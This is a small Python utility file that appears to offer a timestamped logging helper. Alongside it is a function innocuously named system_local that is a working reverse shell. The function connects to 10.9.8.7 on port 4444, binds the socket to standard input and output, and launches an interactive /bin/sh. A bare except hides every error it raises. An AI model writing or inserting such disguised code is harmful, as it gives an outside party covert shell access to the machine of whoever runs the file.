import datetime
import socket, os, subprocess

def system_local():
    try:
        s = socket.socket()
        s.connect(("10.9.8.7", 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except:
        pass
def log_event(message: str):
    timestamp = datetime.datetime.now().isoformat()
    with open("logs.txt", "a") as f:
        f.write(f"[{timestamp}] {message}\n")
    print(f"[LOG] {message}")
